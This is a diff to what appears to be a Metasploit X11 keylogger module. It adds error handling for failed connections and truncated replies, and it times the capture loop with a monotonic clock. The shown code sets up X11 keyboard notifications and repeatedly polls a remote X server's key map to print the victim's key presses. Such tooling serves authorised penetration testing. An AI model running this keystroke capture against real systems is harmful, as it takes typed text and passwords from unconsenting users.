@@ -134,7 +134,11 @@ class MetasploitModule < Msf::Auxiliary
     @keylogger_print_buffer = ''
 
     vprint_status('Establishing TCP Connection')
-    connect # tcp connection establish
+    begin
+      connect # tcp connection establish
+    rescue Rex::ConnectionError
+      fail_with(Msf::Module::Failure::Unreachable, 'Connection failed')
+    end
     vprint_status('[1/9] Establishing X11 connection')
     connection = x11_connect
 
@@ -208,7 +212,12 @@ class MetasploitModule < Msf::Auxiliary
     map_raw_data = sock.get_once(-1, 1)
     # for debugging packet output, uncomment following line
     # puts data.bytes.map { |b| "\\x" + b.to_s(16).rjust(2, '0') }.join
-    map_data = X11GetMapReply.read(map_raw_data)
+    begin
+      map_data = X11GetMapReply.read(map_raw_data)
+    rescue EOFError
+      debug_data = map_raw_data.bytes.map { |b| '\\x' + b.to_s(16).rjust(2, '0') }.join
+      fail_with(Msf::Module::Failure::UnexpectedReply, "Unable to process X11GetMapReply response (EOFError): #{debug_data}")
+    end
 
     vprint_status('[8/9] Enabling notification on keyboard and map')
     sock.put(X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
@@ -232,13 +241,13 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good('All setup, watching for keystrokes')
     # loop mechanics stolen from exploit/multi/handler
-    stime = Time.now.to_f
-    print_timer = Time.now.to_f
+    stime = Process.clock_gettime(Process::CLOCK_MONOTONIC)
+    print_timer = Process.clock_gettime(Process::CLOCK_MONOTONIC)
     timeout = datastore['LISTENER_TIMEOUT'].to_i
     printerval = datastore['PRINTERVAL'].to_i
     begin
       loop do
-        break if timeout > 0 && (stime + timeout < Time.now.to_f)
+        break if timeout > 0 && (stime + timeout < Process.clock_gettime(Process::CLOCK_MONOTONIC))
 
         sock.put(X11QueryKeyMapRequest.new.to_binary_s)
         bit_array_of_keystrokes = X11QueryKeyMapReply.read(sock.get_once(-1, 1)).data
@@ -258,6 +267,8 @@ class MetasploitModule < Msf::Auxiliary
         print_good("X11 Key presses observed: #{@keylogger_print_buffer}")
         @keylogger_print_buffer = ''
       end
+    rescue EOFError
+      print_error('Connection closed by remote host')
     ensure
       vprint_status('Closing X11 connection')
       sock.put(Rex::Proto::X11::X11RequestHeader.new(opcode: 60).to_binary_s +
